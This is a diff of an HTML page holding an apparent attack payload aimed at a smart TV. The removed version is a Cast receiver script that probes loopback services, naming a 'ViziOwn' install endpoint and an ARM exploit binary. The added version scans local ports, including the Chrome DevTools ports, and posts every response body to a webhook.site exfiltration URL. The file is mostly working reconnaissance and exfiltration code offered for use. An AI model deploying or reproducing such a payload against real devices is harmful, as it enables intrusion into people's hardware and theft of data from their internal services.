@@ -1,51 +1,63 @@
 <!DOCTYPE html>
 <html>
-<head><script>
-window.__onGCastApiAvailable = function(loaded) {
-  if (!loaded) return;
-  
-  const ctx = cast.framework.CastReceiverContext.getInstance();
-  const bus = ctx.getCastMessageBus('urn:x-cast:recon');
-  
-  async function probe(url) {
-    try {
-      const r = await fetch(url);
-      const text = await r.text();
-      bus.broadcast(JSON.stringify({url, status: r.status, body: text.slice(0, 2000)}));
-    } catch(e) {
-      bus.broadcast(JSON.stringify({url, error: e.toString()}));
-    }
+<head><meta charset="utf-8"></head>
+<body>
+<script>
+// Your exfil endpoint - a simple server that logs POST bodies
+const EXFIL = 'https://webhook.site/f223977d-60e6-4b93-8ae2-201d550e29c0';
+
+async function send(data) {
+  try {
+    await fetch(EXFIL, {
+      method: 'POST',
+      headers: {'Content-Type': 'application/json'},
+      body: JSON.stringify(data)
+    });
+  } catch(e) {}
+}
+
+async function probe(url, opts) {
+  try {
+    const r = await fetch(url, opts || {});
+    const body = await r.text();
+    return {url, status: r.status, body: body.slice(0, 3000)};
+  } catch(e) {
+    return {url, error: e.toString()};
+  }
+}
+
+async function main() {
+  send({status: 'alive', ua: navigator.userAgent});
+
+  // Core targets - these may be completely open from loopback
+  const targets = [
+    'http://127.0.0.1:7345/state/device/deviceinfo',
+    'http://127.0.0.1:7345/scpl/install',
+    'http://127.0.0.1:7345/scpl/update/override_group',
+    'http://127.0.0.1:7345/scpl/status',
+    'http://127.0.0.1:7345/menu_native/dynamic/tv_settings/system',
+    'http://127.0.0.1:8012/',
+    'http://127.0.0.1:9223/json',
+    'http://127.0.0.1:9223/json/version',
+    'http://127.0.0.1:9222/json',
+    'http://127.0.0.1:10101/',
+    'http://127.0.0.1:80/',
+    'http://127.0.0.1:8080/',
+    'http://127.0.0.1:3000/',
+    'http://127.0.0.1:5000/',
+    'http://127.0.0.1:1080/',
+  ];
+
+  for (const url of targets) {
+    const result = await probe(url);
+    send(result);
+    await new Promise(r => setTimeout(r, 300));
   }
 
-  ctx.addEventListener(cast.framework.system.EventType.READY, async () => {
-    // Probe localhost services - these may have completely different
-    // access controls than the network-facing API
-    const targets = [
-      'http://127.0.0.1:7345/state/device/deviceinfo',
-      'http://127.0.0.1:7345/scpl/install',          // The patched ViziOwn endpoint
-      'http://127.0.0.1:7345/scpl/update/override_group',
-      'http://127.0.0.1:8012/',
-      'http://127.0.0.1:9223/json',
-      'http://127.0.0.1:9000/state/device/deviceinfo',
-      'http://127.0.0.1:10101/',
-      // Internal services that may only be bound to loopback
-      'http://127.0.0.1:80/',
-      'http://127.0.0.1:8080/',
-      'http://127.0.0.1:3000/',
-      'http://127.0.0.1:5000/',
-    ];
-    
-    for (const url of targets) await probe(url);
-    
-    // Also try fetching your ARM exploit binary
-    // and writing it somewhere executable
-    bus.broadcast(JSON.stringify({status: 'probe complete'}));
-  });
+  send({status: 'probe_complete'});
+}
 
-  ctx.start();
-};
+main();
 </script>
-<script src="//www.gstatic.com/cast/sdk/libs/caf_receiver/v3/cast_receiver_framework.js"></script>
-</head>
-<body></body>
+</body>
 </html>
